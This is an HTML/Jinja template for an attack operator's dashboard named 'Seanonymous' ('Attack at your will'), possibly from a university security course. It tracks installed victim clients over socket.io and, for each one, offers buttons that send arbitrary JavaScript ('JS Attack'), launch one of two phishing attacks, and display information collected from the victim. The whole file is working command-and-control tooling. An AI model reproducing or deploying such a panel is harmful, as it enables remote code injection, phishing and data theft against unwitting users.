<!DOCTYPE html>
<html lang="en">
<head>
    <title>Seanonymous</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.3/socket.io.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    <script>
        $(document).ready(function(){
            $("#inputToSearch").on("keyup", function(){
                var value = $(this).val().toLowerCase();
                $("#userlist tr").filter(function(){
                    $(this).toggle($(this).text().toLowerCase().indexOf(value)>-1)
                });
            });
        });
    </script>
</head>

<body id="doc"
      style="background-image: url('https://mdbootstrap.com/img/Photos/Others/background.jpg'); background-size: auto; background-position: center center;">

<div class="text-center alert alert-success success" style="display:none">
    <a href="#" class="close" data-dismiss="alert" aria-label="close">&times;</a>
    <strong id="success-message">Success!</strong>
</div>

<div class="container ">
    <div>
        <form action="{{ (url_for('logout', next = request.endpoint)) }}" method="post">
            <button class=" btn btn-outline-secondary buttontext" style="margin-top: 2%;">Log Out</button>
        </form>
        <h1 class="text-center display-3 title">Welcome, Seanonymous!</h1>
        <h4 class="text-center display-4 subtitle">Attack at your will.</h4>
        <input class="form-control" id = "inputToSearch" type = "text" placeholder="Search for user...">
    </div>

    <div id="userlistdiv">
        <table class="table" id="userlist" style="margin:0px">
            <thead class="thead-dark">
            <tr>
                <th class="text-center">ID</th>
                <th class="text-center">Status</th>
                <th class="text-center">JS Attack</th>
                <th class="text-center">Phishing Attack</th>
                <th class="text-center"></th>
            </tr>
            </thead>
            <tbody>
            {% for item in data %}

                <tr id="row{{ item[0] }}" class="userrow">
                    <td class="text-center rowtext">
                        <button class="transparentbutton" id = "clientid" onclick="get_info_display_new_tab({{ item[0] }})">
                            <u>{{ item[0] }}</u></button>
                    </td>

                    {% if active_users.__contains__(item[0]|string) %}
                        <td class="text-center rowtext" id=status{{ item[0] }} style="background-color: green; ">Online
                        </td>
                    {% else %}
                        <td class="text-center rowtext" id=status{{ item[0] }} style="background-color: red">
                            Offline
                        </td>
                    {% endif %}

                    <td class="text-center">
                        <form class="input-group">
                            <input id={{ item[0] }} type="text" class="form-control"
                                   aria-label="Text input with segmented dropdown button">
                            <div class="input-group-append    ">
                                <button type="reset" class="btn btn-outline-secondary buttontext"
                                        onclick="call_javascript({{ item[0] }})">Execute
                                </button>
                            </div>
                        </form>
                    </td>
                    <td class="text-center">
                        <div class="btn-group" role="group" aria-label="Basic example">
                            <button type="button" class="btn btn-outline-secondary buttontext"
                                    onclick="call_phishing({{ item[0] }},1)">Phish #1
                            </button>
                            <button type="button" class="btn btn-outline-secondary buttontext"
                                    onclick="call_phishing({{ item[0] }},2)">Phish #2
                            </button>
                        </div>
                    </td>
                    <td><a id="testing" class="btn btn-primary" data-toggle="collapse"
                           href=".collapse{{ item[0] }}" role="button"
                           aria-expanded="false" aria-controls="collapse{{ item[0] }}"
                           onclick="get_info_display_same_page({{ item[0] }})">
                        View Info
                    </a></td>
                </tr>


                <tr class="col-md-12" id="collapserow{{ item[0] }}" style="background-color: white" >
                    <td colspan="5"  class="collapse{{ item[0] }} collapse" id="moreinfo{{ item[0] }}" >

                    </td>
                </tr>

            {% endfor %}

            </tbody>
        </table>
    </div>
</div>
<script>
    $(document).ready(function () {
        var socket = io.connect("https://cse331.andrewjaffie.me/socket.io");

        socket.on('disconnectSuccessful', function (id) {
            var fullid = "status" + id.id;
            element = document.getElementById(fullid);
            element.style.backgroundColor = "red";
            element.innerHTML = "Offline";
        });
	socket.on('connect', function (id) {
	    console.log("web app connected to server")
	});
	socket.on('disconnect', function (id) {
		console.log("web app disconnected from server")
	});
        socket.on('connectSuccessful', function (id) {
            var fullid = "status" + id.id;
            element = document.getElementById(fullid);
            element.style.backgroundColor = "green";
            element.innerHTML = "Online"
        });

        socket.on('pingSuccessful', function (id) {
            get_info_display_same_page(id.id);
        });

        socket.on('newClientInstall', function (id, online) {
	    console.log(id)
            var $t = $("#userlist");
            var $tbody = $t.find("tbody");
            var $trLast = $tbody.find("tr:last").prev('tr');
            var $trLastCollapse = $tbody.find("tr:last");
            var $trNew = $trLast.clone();
            var $trNewCollapse = $trLastCollapse.clone()

            var $pattern = RegExp($trLast.find('td:first').text().trim(),"g");
            $trNew.html($trNew.html().replace($pattern, id));
            $trNewCollapse.html($trNewCollapse.html().replace($pattern, id));

            if(online = 'True'){
                var status =  $trNew.find("td:first").next('td');
                status.css('background-color', 'green');
                status.text('Online');
                console.log(status)
            }
            $t.append($trNew);
            $t.append($trNewCollapse);
        });

        socket.on('clientUninstall', function (id) {
            var rowToDelete = document.getElementById("row" + id.id);
            var collapseToDelete = document.getElementById("collapserow" + id.id);
            rowToDelete.parentNode.removeChild(rowToDelete);
            collapseToDelete.parentNode.removeChild(collapseToDelete);
        })
    })
</script>
<script>
    function call_javascript(person) {
        document.getElementById("success-message").innerHTML = "JS Attack on " + person + " sent!";
        $('.success').fadeIn().delay(2000).fadeOut();
        $.ajax({
            url: "/sendjs",
            type: "post",
            data: {
                id: person,
                js: document.getElementById(person).value
            },
            success: function (response) {
                console.log(response);
            },
            error: function (error) {
                console.log(error)
            }
        });
    }

    function call_phishing(id, attackNumber) {
        document.getElementById("success-message").innerHTML = "Phishing Attack #" + attackNumber + " on " + id + " sent!";
        $('.success').fadeIn().delay(500).fadeOut();
        $.ajax({
            url: "/phish",
            type: "post",
            data: {
                id: id,
                number: attackNumber
            },
            success: function (response) {
                console.log('Success');
            },
            error: function (error) {
                console.log(error)
            }
        });


    }

    function get_info_display_new_tab(person) {
        $.ajax({
            url: "/getinfo",
            type: "post",
            data: {
                id: person,
            },
            success: function (response) {
                console.log('Success');
                var new_page = window.open();
                new_page.document.write(response)
                new_page.document.title = person
            },
            error: function (error) {
                console.log(error)
            }
        });
    }

    function get_info_display_same_page(person) {
        $.ajax({
            url: "/getinfo",
            type: "post",
            data: {
                id: person,
            },
            success: function (response) {
                console.log('Success');
                var a = "collapse" + person;
                moreInfoElement = document.getElementById('moreinfo' + person);
                moreInfoElement.innerHTML = response;
            },
            error: function (error) {
                console.log(error)
            }
        });
    }
</script>

<style>
    .rowtext {
        color: black;
        font-family: Arial;
        font-size: 18px;
        font-weight: bolder;
    }

    .buttontext {
        color: black;
        font-family: Arial;
    }

    .title {
        padding-top: 0;
    }

    .subtitle {
        padding-bottom: 1%;
    }

    .transparentbutton {
        background-color: transparent;
        outline: none;
        border: transparent;
    }
</style>
</body>
</html>
